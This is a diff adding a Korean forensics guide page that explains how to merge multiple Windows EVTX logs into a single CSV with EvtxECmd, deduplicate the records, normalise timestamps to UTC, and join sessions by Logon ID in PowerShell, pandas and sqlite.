@@ -1,0 +1,484 @@
+<!DOCTYPE html>
+<html lang="ko" data-root="..">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta name="color-scheme" content="dark">
+<title>여러 EVTX를 하나의 CSV로 합치기: 채널 통합·컬럼 정규화·sqlite 조인 · FOR-0107 · 포렌식 오프라인 검색</title>
+<link rel="stylesheet" href="../assets/styles.css">
+</head>
+<body>
+<header class="site-header">
+  <div class="header-bar">
+    <a class="brand" href="../index.html">포렌식 오프라인 검색<span class="brand-sub">offline</span></a>
+    <div class="nav-search">
+      <input id="nav-q" type="search" placeholder="검색  (/)" autocomplete="off" spellcheck="false">
+    </div>
+    <nav class="nav-links">
+      <a href="../index.html?q=30%EC%B4%88">30초 트리아지</a>
+      <a href="../index.html?q=%EC%B9%98%ED%8A%B8%EC%8B%9C%ED%8A%B8">치트시트</a>
+    </nav>
+  </div>
+</header>
+<main class="page">
+  <div class="article-layout">
+    <article>
+      <div class="breadcrumb">
+        <a href="../index.html">홈</a> / <a href="../index.html?category=Event%20Log">Event Log</a> / FOR-0107
+      </div>
+      <header class="article-head">
+        <h1>여러 EVTX를 하나의 CSV로 합치기: 채널 통합·컬럼 정규화·sqlite 조인</h1>
+        <div class="article-tags">
+      <span class="badge badge-cat">Event Log</span>
+      <span class="badge badge-type">가이드</span>
+      <span class="badge badge-diff diff-intermediate">중급</span>
+      <span class="badge badge-crit">critical</span>
+      <span class="chip">windows</span>
+        </div>
+      </header>
+      <div class="answer-box">
+    <span class="answer-label">한 줄 결론</span>
+    <p>EvtxECmd.exe -d &lt;폴더&gt; --csv &lt;출력&gt; --csvf all.csv 하나로 winevt 폴더 전체를 한 CSV에 담고, Channel 컬럼으로 채널을 구분하며 Payload 원본 JSON을 반드시 보존한 뒤, 전부 UTC로 두고 같은 초는 채널별 EventRecordId 로 정렬한다 — 조인이 필요하면 그 CSV를 sqlite에 넣는 순간 SQL로 해결된다.</p>
+  </div>
+      <table class="meta-table">
+<tbody>
+<tr><th>추천 툴</th><td>EvtxECmd, Timeline Explorer, PowerShell, sqlite3, Python</td></tr>
+<tr><th>artifact</th><td><code>EVTX</code> · <code>Security.evtx</code> · <code>System.evtx</code> · <code>ForwardedEvents</code> · <code>winevt/Logs</code></td></tr>
+<tr><th>파일 경로</th><td><code>C:\Windows\System32\winevt\Logs</code> · <code>C:\case\out\all.csv</code></td></tr>
+<tr><th>로그 필드</th><td><code>TimeCreated</code> · <code>Channel</code> · <code>EventRecordId</code> · <code>EventId</code> · <code>Computer</code> · <code>UserName</code> · <code>Payload</code> · <code>MapDescription</code> · <code>SourceFile</code> · <code>Provider</code></td></tr>
+<tr><th>파일 형식</th><td><code>evtx</code> · <code>csv</code> · <code>sqlite</code></td></tr>
+<tr><th>검색 별칭</th><td>evtx 여러개 합치기 · 이벤트로그 csv 병합 · evtxecmd 폴더 전체 · 채널 합쳐서 보기 · csv 하나로 만들기 · sqlite로 로그 조인</td></tr>
+</tbody>
+</table>
+      <div class="article-body">
+<h2 id="한-줄-결론">한 줄 결론</h2>
+<p><code>EvtxECmd.exe -d &lt;폴더&gt; --csv &lt;출력&gt; --csvf all.csv</code> 하나로 winevt 폴더 전체를 한 CSV에 담고, <strong><code>Channel</code> 컬럼으로 채널을 구분하며 <code>Payload</code> 원본 JSON을 반드시 보존</strong>한 뒤, 전부 UTC로 두고 같은 초는 채널별 <code>EventRecordId</code> 로 정렬한다 — 조인이 필요하면 그 CSV를 sqlite에 넣는 순간 SQL로 해결된다.</p>
+<h2 id="어떤-문제에서-필요한가">어떤 문제에서 필요한가</h2>
+<ul><li>첨부에 evtx가 10개 이상 있고 어느 채널에 답이 있는지 모르는 문제</li><li>Security와 PowerShell/Operational을 넘나들며 인과를 이어야 하는 문제</li><li>Logon ID·PID·IP로 <strong>여러 채널을 조인</strong>해야 하는 문제</li><li>수백만 행이라 Excel이 열리지 않는 문제</li><li>같은 이벤트가 두 번 보여 개수 집계가 틀리는 문제</li></ul>
+<p>디스크 artifact(<code>$MFT</code>/<code>$J</code>/Prefetch)까지 한 축에 올리는 것은 <a href="./ntfs-artifact-timeline.html">FOR-0050</a>의 몫이다. <strong>이 글은 EVTX 채널들끼리 합치는 단계</strong>만 다룬다.</p>
+<h2 id="문제에서-처음-볼-단서">문제에서 처음 볼 단서</h2>
+<ol><li><code>winevt\Logs</code> 폴더가 통째로 첨부됐다 → <code>-d</code> 한 번으로 끝낸다</li><li>evtx가 3~5개만 있다 → 그래도 <code>-d</code> 로 합친다. 개별로 뽑으면 채널 간 비교가 번거롭다</li><li><code>Archive-Security-*.evtx</code> 가 함께 있다 → <strong>중복 레코드가 생긴다.</strong> 3단계의 중복 제거 필수</li><li><code>ForwardedEvents.evtx</code> 가 있다 → 다른 호스트의 이벤트가 섞여 있다. <code>Computer</code> 로 분리</li><li>파일 크기 합이 수백 MB다 → <code>--inc</code> 로 이벤트를 먼저 좁히거나 sqlite로 간다</li></ol>
+<h2 id="30초-절차">30초 절차</h2>
+<div class="code-block" data-lang="powershell"><button class="copy-btn" type="button" data-copy>복사</button><pre><code class="lang-powershell">EvtxECmd.exe -d &#39;C:\case\winevt&#39; --csv &#39;C:\case\out&#39; --csvf all.csv</code></pre></div>
+<p>바로 채널 분포를 확인한다. <strong>어느 채널에 몇 건이 있는지가 다음 행동을 정한다.</strong></p>
+<div class="code-block" data-lang="powershell"><button class="copy-btn" type="button" data-copy>복사</button><pre><code class="lang-powershell">Import-Csv &#39;C:\case\out\all.csv&#39; |
+  Group-Object Channel |
+  Sort-Object Count -Descending |
+  Select-Object Name, Count | Format-Table -AutoSize</code></pre></div>
+<p>출력 예시:</p>
+<div class="code-block" data-lang="text"><button class="copy-btn" type="button" data-copy>복사</button><pre><code class="lang-text">Name                                                     Count
+Security                                                 82364
+Microsoft-Windows-Sysmon/Operational                     41120
+System                                                   12844
+Microsoft-Windows-PowerShell/Operational                  3418
+Microsoft-Windows-TerminalServices-LocalSessionManager/Operational  214
+Microsoft-Windows-TaskScheduler/Operational                 188
+Windows PowerShell                                          142</code></pre></div>
+<h2 id="상세-절차">상세 절차</h2>
+<h3 id="1단계-한-번에-뽑는다">1단계 — 한 번에 뽑는다</h3>
+<div class="code-block" data-lang="powershell"><button class="copy-btn" type="button" data-copy>복사</button><pre><code class="lang-powershell"># 폴더 전체를 하나의 CSV 로
+EvtxECmd.exe -d &#39;C:\case\winevt&#39; --csv &#39;C:\case\out&#39; --csvf all.csv
+
+# 파일 하나만
+EvtxECmd.exe -f &#39;C:\case\winevt\Security.evtx&#39; --csv &#39;C:\case\out&#39; --csvf sec.csv
+
+# 용량이 클 때 이벤트를 먼저 좁힌다 (쉼표 구분)
+EvtxECmd.exe -d &#39;C:\case\winevt&#39; --csv &#39;C:\case\out&#39; --csvf core.csv --inc 4624,4625,4634,4648,4672,4688,4697,4720,4732,1102,7045,4104,4103
+
+# 필요 없는 이벤트를 빼는 방향
+EvtxECmd.exe -d &#39;C:\case\winevt&#39; --csv &#39;C:\case\out&#39; --csvf noisefree.csv --exc 5379,4798,5058,5061</code></pre></div>
+<div class="table-wrap"><table><thead><tr><th>옵션</th><th>역할</th><th>주의</th></tr></thead><tbody><tr><td><code>-f &lt;파일&gt;</code></td><td>파일 하나</td><td>채널 하나만 필요할 때</td></tr><tr><td><code>-d &lt;폴더&gt;</code></td><td>폴더 전체 재귀</td><td><strong>기본 선택.</strong> 하위 폴더까지 훑는다</td></tr><tr><td><code>--csv &lt;폴더&gt;</code></td><td>출력 폴더</td><td>파일이 아니라 폴더다</td></tr><tr><td><code>--csvf &lt;파일명&gt;</code></td><td>출력 파일명 지정</td><td>지정하지 않으면 타임스탬프가 붙은 이름이 생긴다</td></tr><tr><td><code>--inc &lt;ID,ID&gt;</code></td><td>지정한 Event ID만</td><td><strong>gap 판정용 CSV에는 쓰지 않는다</strong> (FOR-0103)</td></tr><tr><td><code>--exc &lt;ID,ID&gt;</code></td><td>지정한 Event ID 제외</td><td>노이즈 제거</td></tr><tr><td><code>--json</code> / <code>--xml</code></td><td>JSON/XML 출력</td><td>payload를 구조로 다뤄야 할 때</td></tr></tbody></table></div>
+<p>EvtxECmd는 <strong>동일 파일 중복 처리를 방지하는 옵션과 날짜 범위 필터 옵션</strong>을 함께 제공한다. 옵션 이름은 버전에 따라 다르므로 <code>EvtxECmd.exe</code> 를 인자 없이 실행해 도움말을 먼저 본다.</p>
+<h3 id="2단계-채널마다-컬럼이-달라-어긋나는-문제">2단계 — 채널마다 컬럼이 달라 어긋나는 문제</h3>
+<p>EvtxECmd는 채널이 달라도 <strong>같은 상위 스키마</strong>로 내보낸다. 문제가 되는 것은 payload를 펼친 컬럼이다.</p>
+<div class="table-wrap"><table><thead><tr><th>컬럼</th><th>채널에 관계없이 채워지나</th><th>성질</th></tr></thead><tbody><tr><td><code>RecordNumber</code> / <code>EventRecordId</code></td><td>채워진다</td><td>채널 내부 순번</td></tr><tr><td><code>TimeCreated</code></td><td>채워진다</td><td><strong>UTC</strong></td></tr><tr><td><code>EventId</code></td><td>채워진다</td><td>이벤트 종류</td></tr><tr><td><code>Level</code> / <code>Provider</code> / <code>Channel</code> / <code>Computer</code></td><td>채워진다</td><td>채널 판별의 근거</td></tr><tr><td><code>MapDescription</code></td><td><strong>맵 파일이 있는 이벤트만</strong></td><td>없으면 빈 값. 없다고 이벤트가 이상한 것이 아니다</td></tr><tr><td><code>UserName</code> / <code>RemoteHost</code></td><td>맵이 뽑아 준 이벤트만</td><td>편의 컬럼. 신뢰하지 말고 payload로 확인</td></tr><tr><td><code>PayloadData1</code> ~ <code>PayloadData6</code></td><td>맵마다 <strong>다른 필드가 들어간다</strong></td><td><strong>채널·이벤트마다 의미가 다르다.</strong> 여기로 필터하면 틀린다</td></tr><tr><td><code>Payload</code></td><td>항상 채워진다</td><td><strong>원본 EventData의 JSON.</strong> 이것이 진짜 데이터다</td></tr><tr><td><code>SourceFile</code></td><td>채워진다</td><td>어느 evtx에서 왔는지</td></tr></tbody></table></div>
+<p><strong>규칙 하나로 정리한다: 필터와 조인은 <code>Payload</code> 로 하고, <code>PayloadData*</code> 는 눈으로 훑을 때만 쓴다.</strong></p>
+<p><code>PayloadData1</code> 이 4624에서는 Logon Type을, 7045에서는 서비스 이름을 담는다. 같은 컬럼에 다른 의미가 들어가므로 이 컬럼으로 필터한 결과는 채널이 섞이면 무의미하다.</p>
+<p>공통 컬럼만 남긴 정규화 CSV를 하나 만들어 두면 이후 작업이 전부 쉬워진다.</p>
+<div class="code-block" data-lang="powershell"><button class="copy-btn" type="button" data-copy>복사</button><pre><code class="lang-powershell">Import-Csv &#39;C:\case\out\all.csv&#39; |
+  Select-Object @{n=&#39;TimeUTC&#39;;   e={ $_.TimeCreated }},
+                @{n=&#39;Channel&#39;;   e={ $_.Channel }},
+                @{n=&#39;RecordId&#39;;  e={ $_.EventRecordId }},
+                @{n=&#39;EventId&#39;;   e={ $_.EventId }},
+                @{n=&#39;Computer&#39;;  e={ $_.Computer }},
+                @{n=&#39;Provider&#39;;  e={ $_.Provider }},
+                @{n=&#39;User&#39;;      e={ $_.UserName }},
+                @{n=&#39;Summary&#39;;   e={ $_.MapDescription }},
+                @{n=&#39;Payload&#39;;   e={ $_.Payload }},
+                @{n=&#39;SourceFile&#39;;e={ $_.SourceFile }} |
+  Export-Csv -NoTypeInformation -Encoding UTF8 &#39;C:\case\out\evtx_norm.csv&#39;</code></pre></div>
+<p>컬럼명은 EvtxECmd 버전에 따라 다르다. 스크립트 전에 실제 헤더를 본다.</p>
+<div class="code-block" data-lang="powershell"><button class="copy-btn" type="button" data-copy>복사</button><pre><code class="lang-powershell">Import-Csv &#39;C:\case\out\all.csv&#39; | Select-Object -First 1 | Get-Member -MemberType NoteProperty</code></pre></div>
+<h3 id="3단계-중복-제거">3단계 — 중복 제거</h3>
+<p>같은 이벤트가 두 번 이상 나오는 원인은 네 가지다. <strong>원인에 따라 지우는 방법이 다르다.</strong></p>
+<div class="table-wrap"><table><thead><tr><th>원인</th><th>어떻게 보이나</th><th>처리</th></tr></thead><tbody><tr><td>같은 채널의 백업 파일 (<code>Archive-Security-*.evtx</code>)</td><td><code>Channel</code> + <code>EventRecordId</code> 가 완전히 동일한 행</td><td><strong>진짜 중복.</strong> 그 키로 제거</td></tr><tr><td>폴더에 같은 파일이 두 벌 (복사본)</td><td><code>SourceFile</code> 만 다르고 나머지 동일</td><td>진짜 중복. 제거</td></tr><tr><td><code>ForwardedEvents</code> 채널</td><td><code>Computer</code> 가 다른 호스트인 행이 섞임</td><td><strong>중복이 아니다.</strong> <code>Computer</code> 로 분리해서 본다</td></tr><tr><td>같은 사건이 서로 다른 채널에 기록</td><td>4697(Security) ↔ 7045(System), PowerShell 4103/4104(Operational) ↔ 400/403/600(Windows PowerShell)</td><td><strong>중복이 아니다.</strong> 교차검증 재료로 남긴다</td></tr></tbody></table></div>
+<div class="code-block" data-lang="powershell"><button class="copy-btn" type="button" data-copy>복사</button><pre><code class="lang-powershell"># 진짜 중복 제거: Channel + EventRecordId 가 같으면 같은 레코드다
+$rows = Import-Csv &#39;C:\case\out\evtx_norm.csv&#39;
+$seen = @{}
+$dedup = foreach ($r in $rows) {
+  $k = &#39;{0}|{1}&#39; -f $r.Channel, $r.RecordId
+  if (-not $seen.ContainsKey($k)) { $seen[$k] = $true; $r }
+}
+&#39;{0} -&gt; {1} rows&#39; -f $rows.Count, $dedup.Count
+$dedup | Export-Csv -NoTypeInformation -Encoding UTF8 &#39;C:\case\out\evtx_dedup.csv&#39;</code></pre></div>
+<div class="code-block" data-lang="powershell"><button class="copy-btn" type="button" data-copy>복사</button><pre><code class="lang-powershell"># 중복이 어디서 왔는지 먼저 확인한다 (무작정 지우지 않는다)
+Import-Csv &#39;C:\case\out\evtx_norm.csv&#39; |
+  Group-Object Channel, RecordId |
+  Where-Object { $_.Count -gt 1 } |
+  Select-Object -First 10 @{n=&#39;Key&#39;;e={$_.Name}}, Count,
+                          @{n=&#39;Files&#39;;e={ ($_.Group.SourceFile | Sort-Object -Unique) -join &#39; | &#39; }}</code></pre></div>
+<p><code>Files</code> 컬럼에 <code>Security.evtx</code> 와 <code>Archive-Security-2026-03-13-...evtx</code> 가 함께 나오면 백업 파일 중복이 확정이다.</p>
+<h3 id="4단계-시각-기준-통일-가장-중요">4단계 — 시각 기준 통일 (가장 중요)</h3>
+<p><strong>원칙: 전부 UTC로 두고, 마지막 답 단계에서만 KST로 바꾼다.</strong></p>
+<div class="table-wrap"><table><thead><tr><th>값</th><th>기준</th></tr></thead><tbody><tr><td>EVTX <code>System/TimeCreated/@SystemTime</code></td><td><strong>UTC</strong> (100ns 정밀도)</td></tr><tr><td>EvtxECmd CSV <code>TimeCreated</code></td><td>UTC</td></tr><tr><td>Event Viewer 화면 표시</td><td><strong>로컬 시간대로 변환된 값</strong></td></tr><tr><td><code>Get-WinEvent</code> 의 <code>TimeCreated</code> 속성</td><td>로컬 <code>DateTime</code> 객체 (<code>.ToUniversalTime()</code> 필요)</td></tr><tr><td>텍스트 로그(IIS·앱 로그)</td><td>로그마다 다르다. 섞을 때만 별도 보정</td></tr></tbody></table></div>
+<div class="code-block" data-lang="text"><button class="copy-btn" type="button" data-copy>복사</button><pre><code class="lang-text">KST = UTC + 9시간</code></pre></div>
+<p>여기서 사고가 나는 지점이 하나 있다. <strong><code>Get-WinEvent</code> 는 로컬 시각을, EvtxECmd CSV는 UTC를 준다.</strong> 두 방법의 결과를 같은 표에 올리면 9시간 어긋난다.</p>
+<div class="code-block" data-lang="powershell"><button class="copy-btn" type="button" data-copy>복사</button><pre><code class="lang-powershell"># Get-WinEvent 결과를 UTC 로 맞춘다
+Get-WinEvent -Path &#39;C:\case\Security.evtx&#39; -Oldest |
+  Select-Object @{n=&#39;TimeUTC&#39;;e={ $_.TimeCreated.ToUniversalTime().ToString(&#39;yyyy-MM-ddTHH:mm:ss.fffffffZ&#39;) }},
+                RecordId, Id, ProviderName
+
+# 완성된 CSV 에 KST 컬럼을 덧붙인다 (답 제출용)
+Import-Csv &#39;C:\case\out\evtx_dedup.csv&#39; |
+  Select-Object *, @{n=&#39;TimeKST&#39;;e={ ([datetime]$_.TimeUTC).AddHours(9).ToString(&#39;yyyy-MM-dd HH:mm:ss&#39;) }} |
+  Export-Csv -NoTypeInformation -Encoding UTF8 &#39;C:\case\out\evtx_kst.csv&#39;</code></pre></div>
+<h3 id="5단계-같은-초-정렬은-채널별-eventrecordid-로">5단계 — 같은 초 정렬은 채널별 EventRecordId 로</h3>
+<p>합친 CSV를 <code>TimeCreated</code> 로만 정렬하면 같은 초에서 순서가 무작위가 된다. 정렬 키는 <strong><code>Channel</code> → <code>TimeUTC</code> → <code>RecordId</code></strong> 순이다.</p>
+<div class="code-block" data-lang="powershell"><button class="copy-btn" type="button" data-copy>복사</button><pre><code class="lang-powershell">Import-Csv &#39;C:\case\out\evtx_dedup.csv&#39; |
+  Sort-Object @{e={ [datetime]$_.TimeUTC }}, @{e={ $_.Channel }}, @{e={ [int64]$_.RecordId }} |
+  Select-Object TimeUTC, Channel, RecordId, EventId, User, Summary |
+  Export-Csv -NoTypeInformation -Encoding UTF8 &#39;C:\case\out\evtx_sorted.csv&#39;</code></pre></div>
+<p><code>RecordId</code> 는 <strong>같은 채널 안에서만</strong> 의미가 있다. 채널이 다른 두 행의 순서는 번호로 정할 수 없다. 그 판정 규칙은 FOR-0103에 있다.</p>
+<h3 id="6단계-방법-세-가지-비교">6단계 — 방법 세 가지 비교</h3>
+<div class="table-wrap"><table><thead><tr><th>방법</th><th>적정 규모</th><th>강점</th><th>약점</th></tr></thead><tbody><tr><td>PowerShell <code>Import-Csv</code></td><td>수만 행</td><td>추가 설치 없음. 즉시 시작</td><td>전부 메모리에 올린다. 수십만 행부터 급격히 느려짐</td></tr><tr><td>Python <code>pandas</code></td><td>수백만 행</td><td>그룹핑·피벗·조인이 짧다</td><td>메모리 사용량. dtype 지정 안 하면 값이 변형된다</td></tr><tr><td><code>sqlite3</code></td><td>수백만 행 이상</td><td><strong>SQL 조인·인덱스.</strong> 반복 질의가 빠르다</td><td>한 번 넣는 수고가 필요</td></tr><tr><td>Timeline Explorer</td><td>수십만 행</td><td>컬럼 필터·태깅·북마크가 즉시</td><td>조인은 못 한다</td></tr></tbody></table></div>
+<p>실전 판단: <strong>행이 10만 미만이면 PowerShell, 그 이상이고 조인이 필요하면 sqlite, 집계·통계가 필요하면 pandas.</strong></p>
+<h4 id="6-1-powershell">6-1. PowerShell</h4>
+<div class="code-block" data-lang="powershell"><button class="copy-btn" type="button" data-copy>복사</button><pre><code class="lang-powershell">$rows = Import-Csv &#39;C:\case\out\evtx_dedup.csv&#39;
+
+# 채널 x 이벤트 분포
+$rows | Group-Object Channel, EventId | Sort-Object Count -Descending |
+  Select-Object -First 25 Name, Count
+
+# 사건 시각 창으로 좁힌다 (UTC)
+$rows | Where-Object {
+  ([datetime]$_.TimeUTC) -ge [datetime]&#39;2026-03-14T07:15:00Z&#39; -and
+  ([datetime]$_.TimeUTC) -le [datetime]&#39;2026-03-14T08:00:00Z&#39;
+} | Sort-Object @{e={[datetime]$_.TimeUTC}}, @{e={[int64]$_.RecordId}} |
+  Format-Table TimeUTC, Channel, EventId, User, Summary -AutoSize</code></pre></div>
+<h4 id="6-2-python-pandas">6-2. Python (pandas)</h4>
+<div class="code-block" data-lang="python"><button class="copy-btn" type="button" data-copy>복사</button><pre><code class="lang-python">import glob
+import pandas as pd
+
+files = glob.glob(r&#39;C:\case\out\*.csv&#39;)
+
+# dtype=str 를 반드시 준다. 안 주면 0x1a2b3c 가 NaN 이 되거나
+# 큰 정수가 float 으로 바뀌어 EventRecordId 가 망가진다
+frames = [pd.read_csv(f, dtype=str, encoding=&#39;utf-8-sig&#39;, low_memory=False) for f in files]
+
+# 채널마다 컬럼 집합이 다르면 교집합만 남긴다
+common = set(frames[0].columns)
+for fr in frames[1:]:
+    common &amp;= set(fr.columns)
+common = [c for c in frames[0].columns if c in common]
+
+df = pd.concat([fr[common] for fr in frames], ignore_index=True)
+
+# 진짜 중복 제거
+df = df.drop_duplicates(subset=[&#39;Channel&#39;, &#39;EventRecordId&#39;])
+
+# 정렬: 시각 -&gt; 채널 -&gt; 레코드 번호
+df[&#39;_t&#39;] = pd.to_datetime(df[&#39;TimeCreated&#39;], utc=True, errors=&#39;coerce&#39;)
+df[&#39;_r&#39;] = pd.to_numeric(df[&#39;EventRecordId&#39;], errors=&#39;coerce&#39;)
+df = df.sort_values([&#39;_t&#39;, &#39;Channel&#39;, &#39;_r&#39;])
+
+# KST 컬럼 (제출용)
+df[&#39;TimeKST&#39;] = df[&#39;_t&#39;].dt.tz_convert(&#39;Asia/Seoul&#39;).dt.strftime(&#39;%Y-%m-%d %H:%M:%S&#39;)
+
+print(df.groupby([&#39;Channel&#39;, &#39;EventId&#39;]).size().sort_values(ascending=False).head(25))
+df.drop(columns=[&#39;_t&#39;, &#39;_r&#39;]).to_csv(r&#39;C:\case\out\evtx_merged.csv&#39;, index=False, encoding=&#39;utf-8-sig&#39;)</code></pre></div>
+<p><code>dtype=str</code> 을 빠뜨리면 pandas가 <code>EventRecordId</code> 를 float로 읽어 큰 값의 마지막 자리가 바뀐다. <strong>정렬 근거가 조용히 망가지는 사고</strong>다.</p>
+<h4 id="6-3-sqlite3-조인이-필요하면-이것">6-3. sqlite3 — 조인이 필요하면 이것</h4>
+<div class="code-block" data-lang="bash"><button class="copy-btn" type="button" data-copy>복사</button><pre><code class="lang-bash"># 최신 sqlite3 (CSV 모드 플래그 지원)
+sqlite3 case.db &quot;.import --csv C:/case/out/evtx_dedup.csv evtx&quot;
+
+# 구버전 문법
+sqlite3 case.db</code></pre></div>
+<div class="code-block" data-lang="sql"><button class="copy-btn" type="button" data-copy>복사</button><pre><code class="lang-sql">.mode csv
+.headers on
+.import C:/case/out/evtx_dedup.csv evtx
+
+-- 조회를 빠르게 (반복 질의 전에 반드시)
+CREATE INDEX idx_ch_rec ON evtx(Channel, RecordId);
+CREATE INDEX idx_time   ON evtx(TimeUTC);
+CREATE INDEX idx_eid    ON evtx(EventId);
+
+-- 채널 x 이벤트 분포
+SELECT Channel, EventId, COUNT(*) AS n
+FROM evtx GROUP BY Channel, EventId ORDER BY n DESC LIMIT 25;
+
+-- 사건 창 안의 전 채널 이벤트를 순서대로
+SELECT TimeUTC, Channel, RecordId, EventId, User, Summary
+FROM evtx
+WHERE TimeUTC BETWEEN &#39;2026-03-14 07:15:00&#39; AND &#39;2026-03-14 08:00:00&#39;
+ORDER BY TimeUTC, Channel, CAST(RecordId AS INTEGER);
+
+-- 시각을 KST 로 (답 제출용)
+SELECT datetime(TimeUTC, &#39;+9 hours&#39;) AS TimeKST, Channel, EventId, Summary
+FROM evtx WHERE EventId IN (4624, 4688, 1102) ORDER BY TimeUTC;</code></pre></div>
+<p><strong>여기서 sqlite의 진짜 값이 나온다 — Logon ID 조인.</strong> 정규화한 컬럼을 하나 만들어 두면 SQL 한 줄로 세션 활동이 나온다.</p>
+<div class="code-block" data-lang="sql"><button class="copy-btn" type="button" data-copy>복사</button><pre><code class="lang-sql">-- payload 에서 Logon ID 를 뽑아 별도 컬럼으로 고정한다
+ALTER TABLE evtx ADD COLUMN LogonId TEXT;
+
+UPDATE evtx
+SET LogonId = lower(
+  CASE
+    WHEN Payload LIKE &#39;%TargetLogonId%&#39;  THEN substr(Payload, instr(Payload, &#39;TargetLogonId&#39;)  + 17, 10)
+    WHEN Payload LIKE &#39;%SubjectLogonId%&#39; THEN substr(Payload, instr(Payload, &#39;SubjectLogonId&#39;) + 18, 10)
+  END);</code></pre></div>
+<p><code>substr</code>/<code>instr</code> 로 자르는 오프셋은 payload의 실제 표기(따옴표·공백)에 따라 달라진다. <strong>문자열 위치로 자르는 방식은 검산이 필요하다.</strong> 확실하게 하려면 4단계의 정규화 CSV를 만들 때 Python에서 <code>LogonId</code> 컬럼을 계산해 넣고, sqlite에는 완성된 CSV를 넣는다.</p>
+<div class="code-block" data-lang="python"><button class="copy-btn" type="button" data-copy>복사</button><pre><code class="lang-python"># 정규화 단계에서 LogonId 컬럼을 미리 계산해 넣는 편이 안전하다
+import csv, re
+
+FIELD_RE = re.compile(r&#39;&quot;(?:Target|Subject)LogonId&quot;\s*:\s*&quot;?(0x[0-9a-fA-F]+)&#39;, re.I)
+
+with open(r&#39;C:\case\out\evtx_dedup.csv&#39;, encoding=&#39;utf-8-sig&#39;, newline=&#39;&#39;) as fin, \
+     open(r&#39;C:\case\out\evtx_sql.csv&#39;, &#39;w&#39;, encoding=&#39;utf-8&#39;, newline=&#39;&#39;) as fout:
+    rd = csv.DictReader(fin)
+    cols = rd.fieldnames + [&#39;LogonIdHex&#39;, &#39;LogonIdDec&#39;]
+    wr = csv.DictWriter(fout, fieldnames=cols)
+    wr.writeheader()
+    for row in rd:
+        m = FIELD_RE.search(row.get(&#39;Payload&#39;) or &#39;&#39;)
+        row[&#39;LogonIdHex&#39;] = m.group(1).lower() if m else &#39;&#39;
+        row[&#39;LogonIdDec&#39;] = str(int(m.group(1), 16)) if m else &#39;&#39;
+        wr.writerow(row)</code></pre></div>
+<div class="code-block" data-lang="sql"><button class="copy-btn" type="button" data-copy>복사</button><pre><code class="lang-sql">-- 이제 세션 활동이 SQL 한 줄이다
+SELECT TimeUTC, Channel, EventId, User, Summary
+FROM evtx_sql
+WHERE LogonIdDec = 1715004                    -- 0x1a2b3c
+ORDER BY TimeUTC, Channel, CAST(RecordId AS INTEGER);
+
+-- 세션별 활동량 랭킹 (예약 세션 제외)
+SELECT LogonIdHex, COUNT(*) AS n, MIN(TimeUTC) AS first, MAX(TimeUTC) AS last
+FROM evtx_sql
+WHERE LogonIdHex &lt;&gt; &#39;&#39; AND LogonIdHex NOT IN (&#39;0x3e7&#39;,&#39;0x3e5&#39;,&#39;0x3e4&#39;,&#39;0x0&#39;)
+GROUP BY LogonIdHex ORDER BY n DESC LIMIT 20;
+
+-- 채널 교차 조인: 4688 이 있는 시각의 PowerShell 4104
+SELECT a.TimeUTC AS proc_time, a.Summary AS proc, b.TimeUTC AS ps_time, b.Summary AS script
+FROM evtx_sql a
+JOIN evtx_sql b
+  ON b.Channel = &#39;Microsoft-Windows-PowerShell/Operational&#39;
+ AND b.EventId = &#39;4104&#39;
+ AND ABS(strftime(&#39;%s&#39;, b.TimeUTC) - strftime(&#39;%s&#39;, a.TimeUTC)) &lt;= 5
+WHERE a.Channel = &#39;Security&#39; AND a.EventId = &#39;4688&#39;
+  AND a.Summary LIKE &#39;%powershell%&#39;
+ORDER BY a.TimeUTC;</code></pre></div>
+<p>sqlite의 날짜 함수는 <code>YYYY-MM-DD HH:MM:SS</code> 형태의 문자열을 기대한다. CSV의 시각 표기가 <code>2026-03-14T07:19:02.4718235Z</code> 처럼 ISO 8601이면 <code>strftime</code> 이 동작하지 않을 수 있으므로, 넣기 전에 <code>T</code> 와 <code>Z</code> 를 정리하거나 <code>replace()</code> 로 감싼다.</p>
+<h3 id="7단계-timeline-explorer-활용">7단계 — Timeline Explorer 활용</h3>
+<p>합친 CSV를 Timeline Explorer로 열면 조인은 못 하지만 탐색이 가장 빠르다.</p>
+<div class="table-wrap"><table><thead><tr><th>하고 싶은 것</th><th>방법</th></tr></thead><tbody><tr><td>채널 하나만</td><td><code>Channel</code> 컬럼 필터</td></tr><tr><td>사건 시각 창</td><td><code>TimeUTC</code> 컬럼 필터에 <code>2026-03-14 07:3</code> 같은 부분 문자열</td></tr><tr><td>특정 Logon ID</td><td><code>Payload</code> 컬럼 필터에 <code>0x1a2b3c</code></td></tr><tr><td>이벤트 종류 묶음</td><td><code>EventId</code> 컬럼 필터</td></tr><tr><td>중요 행 표시</td><td>행 태깅/북마크 후 태그된 행만 보기</td></tr><tr><td>결과 저장</td><td>필터 적용 상태를 CSV/Excel로 내보내기</td></tr></tbody></table></div>
+<h3 id="8단계-대용량-전략">8단계 — 대용량 전략</h3>
+<div class="table-wrap"><table><thead><tr><th>규모</th><th>전략</th></tr></thead><tbody><tr><td>~10만 행</td><td>그대로 PowerShell / Timeline Explorer</td></tr><tr><td>10만~100만 행</td><td><code>--inc</code> 로 이벤트 축소 → 정규화 CSV → sqlite (인덱스 필수)</td></tr><tr><td>100만 행 이상</td><td>채널별로 파일을 나눠 뽑고, 필요한 채널만 sqlite에 넣는다. Python은 <code>csv.DictReader</code> 스트리밍으로 처리</td></tr><tr><td>Excel로 열 수 없다</td><td>애초에 열지 않는다. 65,536/1,048,576행 한계가 있고 큰 숫자·<code>0x</code> 문자열이 변형된다</td></tr></tbody></table></div>
+<div class="code-block" data-lang="powershell"><button class="copy-btn" type="button" data-copy>복사</button><pre><code class="lang-powershell"># 채널별로 나눠 뽑기 (필요한 채널만 이후 단계로)
+Get-ChildItem &#39;C:\case\winevt\*.evtx&#39; | ForEach-Object {
+  $name = $_.BaseName -replace &#39;[^A-Za-z0-9]&#39;, &#39;_&#39;
+  EvtxECmd.exe -f $_.FullName --csv &#39;C:\case\out&#39; --csvf &quot;$name.csv&quot;
+}</code></pre></div>
+<p><strong>Excel로 CSV를 열어 저장하는 것이 가장 흔한 데이터 파괴 경로다.</strong> <code>0x1a2b3c</code> 가 수식으로 해석되거나, 큰 <code>EventRecordId</code> 가 지수 표기로 바뀌거나, 앞의 0이 사라진다. 편집이 필요하면 Timeline Explorer나 텍스트 에디터를 쓴다.</p>
+<h2 id="출력-필드-해석">출력 필드 해석</h2>
